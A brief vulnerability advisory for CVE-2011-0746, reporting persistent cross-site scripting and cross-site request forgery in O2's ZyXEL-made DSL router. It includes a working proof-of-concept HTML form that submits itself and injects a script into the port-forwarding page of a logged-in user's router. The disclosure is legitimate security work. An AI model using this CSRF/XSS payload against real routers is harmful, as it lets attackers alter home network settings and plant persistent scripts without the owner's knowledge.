#### O2 classic router: persistent cross site scripting (XSS) and cross site request forgery (CSRF)

##### References

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0746>

<http://int21.de/cve/CVE-2011-0746-o2-router.html>

##### Description

The default DSL router shipped by the german company O2 is completely
vulnerable to persistent cross site scripting (XSS) and cross site request forgery (CSRF).
The device is produced by ZyXEL, it seems it has no other name than the brand
"O2 DSL Router Classic".

As an example, the form at */Forms/PortForwarding\_Edit\_1* accepts javascript code
for the parameter *PortRule\_Name*, which will be permanently stored. Also, the form
has no protection against CSRF.

A sample code that will inject permanent javascript when called by a user who is logged
into his router:

```
<form id="form1" method="post" action="http://192.168.1.1/Forms/PortForwarding_Edit_1">
<input name="PortRule_Name" value='"><script>alert(7)</script>'>
<input name="PortRule_SPort" value="77">
<input name="PortRule_EPort" value="77">
<input name="PortRule_SrvAddr" value="10.0.0.1" >
<script>
var frm = document.getElementById("form1");
frm.submit();
</script>

```

This is just an example, all forms in the router interface are vulnerable to CSRF and, if they
accept text input, to XSS.

The vulnerability has been disclosed to O2 in advance without any reply.
